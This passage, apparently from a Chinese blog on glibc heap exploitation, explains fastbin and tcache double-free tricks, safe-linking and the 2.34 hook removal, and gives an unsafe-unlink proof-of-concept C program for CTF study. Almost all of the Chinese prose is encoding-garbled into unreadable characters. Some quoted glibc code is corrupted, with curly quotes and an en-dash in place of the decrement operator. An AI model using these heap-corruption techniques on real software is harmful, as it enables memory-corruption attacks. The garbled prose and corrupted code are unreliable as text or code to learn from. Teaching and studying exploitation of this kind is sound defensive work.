binåï¼Œä»–çš„fdå’ŒbkæŒ‡é’ˆä¼šå…±åŒæŒ‡å‘main_arena+88(å…·ä½“åç§»ä¼¼ä¹ä¼šéšç€ç‰ˆæœ¬å˜åŒ–ï¼Œåšé¢˜æ—¶æ‰‹åŠ¨è°ƒè¯•å³å¯)ï¼Œæ„å‘³ç€å½“å­˜åœ¨UAFæ¼æ´æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å‡ºè¿™ä¸ªchunkçš„å†…å®¹å³èƒ½å¾—åˆ°libc</p></blockquote><h2 id="Fastbin-Dup"><a href="#Fastbin-Dup" class="headerlink" title="Fastbin Dup"></a>Fastbin Dup</h2><p>fastbin dup å®é™…æ˜¯åœ¨fastbiné“¾ä¸Šå®ç°çš„ç‹­ä¹‰çš„double freeã€‚ç”±äºfastbin è‡ªèº«æºç çš„ç¼ºé™·ï¼Œåœ¨å¯¹double free çš„æ£€æµ‹æœºåˆ¶ä»…ä»…éªŒè¯äº†å½“å‰freeæ‰çš„chunkä¸fast bin ç¬¬ä¸€ä¸ªchunkæ˜¯å¦ç›¸åŒï¼Œè€Œå¯¹äºå…¶ä»–chunkåˆ™æ²¡æœ‰åšæ£€æµ‹ã€‚å¦å¤–fastbinåœ¨freeæ—¶ä¼šæ£€æµ‹å½“å‰å½“å‰çš„chunkäºå¤´éƒ¨chunkçš„sizeå¤§å°æ˜¯å¦ç›¸åŒã€‚</p><p>é‚£ä¹ˆæ„é€ double free æ—¶åªéœ€è¦ç©¿æ’ä¸€å—å…¶ä»–çš„chunkå³å¯å®ç°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>);<br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/article/3.png"></p><p>åœ¨å®Œæˆdouble free ä¹‹åæˆ‘ä»¬åªéœ€è¦malloc è¿™é‡Œçš„chunk1 å°±èƒ½å¾—åˆ°ä¸€å— æ—¢æ˜¯allocated åˆæ˜¯ free çŠ¶æ€çš„chunkã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°±èƒ½å¯¹å…¶fdæŒ‡é’ˆè¿›è¡Œä¿®æ”¹ï¼Œä»è€Œæ§åˆ¶fastbiné“¾è¡¨çš„æ–¹å‘æ˜¯æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ï¼Œä¾¿èƒ½å®ç°å¯¹ä»»æ„åœ°å€çš„æ§åˆ¶(è¯»å†™)</p><p><img src="/img/article/4.png"></p><blockquote><p>é¢å¤–éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p><ul><li>fastbinä¼šå¯¹chunkå¤´çš„å¤§å°è¿›è¡Œæ£€æµ‹ï¼Œé‚£ä¹ˆå›¾ä¸­maliceå¤„chunkçš„sizeéœ€è¦æ§åˆ¶å¥½</li><li>libc2.26ä¹‹åï¼Œfreeçš„å°äº0x410çš„chunkä¼šå…ˆè¿›å…¥Tcacheä¸­ï¼Œæœ€å¤šæ‰¿çº³7ä¸ªchunk</li><li>ä¸”åœ¨tcacheå¡«æ»¡ä¹‹åï¼Œmallocä¼˜å…ˆä¼šå–å‡ºtcacheä¸­çš„chunkï¼Œå¯ä»¥åˆ©ç”¨callocä¸ä¼šç”³è¯·tcacheçš„ç‰¹ç‚¹</li></ul></blockquote><h2 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h2><blockquote><p>Tcache åœ¨æœ€è¿‘çš„å‡ ä¸ªlibcä¸­åŠ å…¥äº†å¤šä¸ªæœºåˆ¶ï¼Œç”¨äºä¿è¯å…¶å®‰å…¨æ€§ï¼Œè¿™é‡Œæˆ‘å°†åˆ†ä¸åŒç‰ˆæœ¬è®¨è®º</p></blockquote><h3 id="libc2-26-libc2-28"><a href="#libc2-26-libc2-28" class="headerlink" title="libc2.26-libc2.28"></a>libc2.26-libc2.28</h3><p>åœ¨è¿™å‡ ä¸ªç‰ˆæœ¬ä¸­ï¼Œå‡ ä¹æ²¡æœ‰æ£€æµ‹æœºåˆ¶ï¼Œå¯¹åŒä¸€å—chunkç›´æ¥è¿›è¡Œdouble freeå³å¯ï¼Œç”šè‡³æ¯”fastbin dupè¿˜è¦ç®€æ˜“</p><h3 id="libc2-29-libc2-31"><a href="#libc2-29-libc2-31" class="headerlink" title="libc2.29-libc2.31"></a>libc2.29-libc2.31</h3><p>åœ¨è¿™å‡ ä¸ªç‰ˆæœ¬ä¸­ï¼Œtcache çš„ bkæŒ‡é’ˆå¤„å­˜æ”¾äº†ä¸€ä¸ª8byteçš„éšæœºæ•°ä½œä¸ºkeyï¼Œå³ä»£è¡¨è¿™å—chunkåœ¨tcacheé“¾ä¸­ã€‚æ¯æ¬¡freeæ—¶ï¼Œæ£€æµ‹bkçš„ä½ç½®çš„å€¼æ˜¯å¦ä¸ºkeyï¼Œè‹¥æ˜¯ï¼Œåˆ™ä¸ºdoublefreeã€‚</p><blockquote><p>ç»•è¿‡æ–¹å¼ï¼šå­˜åœ¨UAFæ¼æ´çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ›´æ”¹ï¼Œtcacheä¸­chunkçš„keyå€¼å³å¯</p></blockquote><h3 id="libc2-32"><a href="#libc2-32" class="headerlink" title="libc2.32"></a>libc2.32</h3><h4 id="Safe-linking-ptr-xor"><a href="#Safe-linking-ptr-xor" class="headerlink" title="Safe-linking(ptr xor)"></a>Safe-linking(ptr xor)</h4><p>libc2.32ä¸­å¼•å…¥äº†Safe-linkingæœºåˆ¶ï¼Œåº”ç”¨äºfastbinå’Œtcacheä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br><span class="hljs-comment">/* Mark this chunk as â€œin the tcacheâ€ so the test in _int_free will</span><br><span class="hljs-comment">detect a double free.  */</span><br>e-&gt;key = tcache;<br><br>e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>tcache-&gt;entries[tc_idx] = e;<br>++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç»glibc-2.32æ›´æ–°åï¼Œe-&gt;nextä¸å†æ˜¯ç›´æ¥æŒ‡å‘åŸæ¥çš„tcacheå¤´æŒ‡é’ˆï¼Œè€Œæ˜¯æŒ‡å‘äº†ç»PROTECT_PTRå¤„ç†è¿‡çš„æŒ‡é’ˆï¼ŒæŸ¥çœ‹PROTECT_PTRå®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)));</span><br></code></pre></td></tr></table></figure><p>ç»“åˆtcache_put()å‡½æ•°å¯ä»¥å¾—å‡ºe-&gt;nextæœ€ç»ˆæŒ‡å‘äº†e-&gt;nextåœ°å€å³ç§»12ä½åçš„å€¼ä¸å½“å‰tcacheå¤´æŒ‡é’ˆå€¼å¼‚æˆ–çš„ç»“æœï¼Œè¿™é‡Œå¼•ç”¨Safe-Linkingè®¾è®¡å¸ˆæ–‡ç« [1]ä¸­çš„ä¸€å¼ å›¾æè¿°æ­¤è¿‡ç¨‹ï¼š</p><p><img src="/img/article/5.png" alt="img"></p><p>å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„å¼‚æˆ–æ“ä½œï¼Œè¿™é‡Œæ‰€æœ‰çš„æŒ‡é’ˆéƒ½è¿›è¡Œäº†å¤„ç†ï¼Œå…·ä½“ç»†èŠ‚å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢ï¼Œä¸è¿‡å¤šèµ˜è¿°</p><h4 id="å†…å­˜å¯¹é½æ£€æµ‹"><a href="#å†…å­˜å¯¹é½æ£€æµ‹" class="headerlink" title="å†…å­˜å¯¹é½æ£€æµ‹"></a>å†…å­˜å¯¹é½æ£€æµ‹</h4><p>æ­¤å¤–ï¼Œåœ¨glibc-2.32ç‰ˆæœ¬ä¸­è¿˜å¼•å…¥äº†å¯¹tcacheå’Œfastbinsä¸­ç”³è¯·åŠé‡Šæ”¾å†…å­˜åœ°å€çš„å¯¹é½æ£€æµ‹ï¼Œä»¥tcache_get()ä¸ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br><br>&#123;<br><br>tcache_entry *e = tcache-&gt;entries[tc_idx];<br><br><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br><br>malloc_printerr (â€œ<span class="hljs-built_in">malloc</span>(): unaligned tcache chunk detectedâ€);<br><br>tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br><br>â€“(tcache-&gt;counts[tc_idx]);<br><br>e-&gt;key = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>aligned_OK()å®šä¹‰ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT â€“ 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span><br><span class="hljs-meta">? __alignof__ (long double) : 2 * SIZE_SZ)</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å†…å­˜åœ°å€éœ€è¦ä»¥0x10å­—èŠ‚å¯¹é½ã€‚</p><h3 id="libc-2-34"><a href="#libc-2-34" class="headerlink" title="libc-2.34"></a>libc-2.34</h3><p>glibc-2.34 çš„åˆ°æ¥ç»™äºˆäº†hookåŠ«æŒæ²‰é‡çš„ä¸€å‡»ï¼Œç§»é™¤äº†ä»¥ä¸‹å‡ ä¸ªhookç¬¦å·ï¼š</p><blockquote><p>__free_hook</p><p>__malloc_hook</p><p>__realloc_hook</p><p>__memalign_hook</p><p>__after_morecore_hook</p></blockquote><h4 id="ç»•è¿‡æ€è·¯"><a href="#ç»•è¿‡æ€è·¯" class="headerlink" title="ç»•è¿‡æ€è·¯"></a>ç»•è¿‡æ€è·¯</h4><ol><li>åˆ©ç”¨IO_vtable</li><li>åˆ©ç”¨exit_hook</li><li>åŠ«æŒè¿”å›åœ°å€è¿›è¡ŒROP</li></ol><h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h2><p>unsafe-unlinkåˆ©ç”¨chunkfreeæ—¶çš„åˆå¹¶æœºåˆ¶ï¼Œå®ç°äº†åœ°å€çš„ä»»æ„è¯»å†™</p><blockquote><p>ä½¿ç”¨æ¡ä»¶ï¼š</p><ul><li>èƒ½å¤Ÿåˆ©ç”¨æº¢å‡ºæˆ–å…¶ä»–æ¼æ´ï¼Œå°†æŸchunkçš„sizeåŸŸçš„æœ€ä½16è¿›åˆ¶ä½ä¿®æ”¹ä¸º0ï¼Œä¾‹: 0x91 â€“&gt; 0x90</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*è¿™æ˜¯ä¸€æ®µunsafe-unlinkçš„ç¤ºä¾‹ä»£ç ï¼Œæˆ‘ä»¬åœ¨æœ€åæˆåŠŸåˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œ</span><br><span class="hljs-comment">å®ç°äº†å¯¹éå †ä¸Šåœ°å€victimstringçš„å†…å®¹æ›´æ”¹*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">uint64_t</span> * chunk0_ptr;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    chunk0_ptr = (<span class="hljs-type">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);       <span class="hljs-comment">//chunk0</span><br>    <span class="hljs-type">uint64_t</span> *chunk1_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);        <span class="hljs-comment">//chunk1</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk0_ptr: %p -&gt; %p\n&quot;</span>,&amp;chunk0_ptr, chunk0_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim chunk: %p\n\n&quot;</span>,chunk1_ptr);<br><br>    <span class="hljs-comment">/*pass the check:   (chunksize(p) != prev_size(next_chunk(P)) == False)</span><br><span class="hljs-comment">                        chunk0_ptr[1] = 0x0;// or 0x8, 0x80*/</span><br><br>    <span class="hljs-comment">//pass the check:   (p-&gt;fd-&gt;bk != p || p-&gt;bk-&gt;fd != p) == False</span><br><br>    chunk0_ptr [<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr - <span class="hljs-number">0x18</span>;<br>    chunk0_ptr [<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr - <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake fd: %p = &amp;chunk0_ptr - 0x18&quot;</span>, (<span class="hljs-type">void</span>*)chunk0_ptr[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake bk: %p = &amp;chunk0_ptr - 0x10&quot;</span>, (<span class="hljs-type">void</span>*)chunk0_ptr[<span class="hljs-number">3</span>]);<br>    <br>    <span class="hljs-type">uint64_t</span> *chunk1_hdr = (<span class="hljs-type">void</span>*) chunk1_ptr - <span class="hljs-number">0x10</span>;<br>    chunk1_hdr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x80</span>;<br>    chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/*  int *t[10], i;                  //tcache</span><br><span class="hljs-comment">        for(i=0; i&lt;7; i++)&#123;</span><br><span class="hljs-comment">            t[i] = malloc(0x80);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        for(i=0;i&lt;7;i++)&#123;</span><br><span class="hljs-comment">            free(t[i]);</span><br><span class="hljs-comment">        &#125;;  */</span><br><br>    <span class="hljs-built_in">free</span>(chunk1_ptr);               <span class="hljs-comment">//unlink</span><br><br>    <span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>] = <span class="hljs-string">&quot;AAAAAAA&quot;</span>;<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;   <span class="hljs-comment">//overwrite itself</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;old value: %s\n&quot;</span>, victim_string);<br><br>    chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x42424242424242</span>LL;     <span class="hljs-comment">//over wirting victim_string</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;new Value: %s\n&quot;</span>, victim_string);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç¤ºä¾‹å›¾"><a href="#ç¤ºä¾‹å›¾" class="headerlink" title="ç¤ºä¾‹å›¾"></a>ç¤ºä¾‹å›¾</h4><p><img src="/img/article/6.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
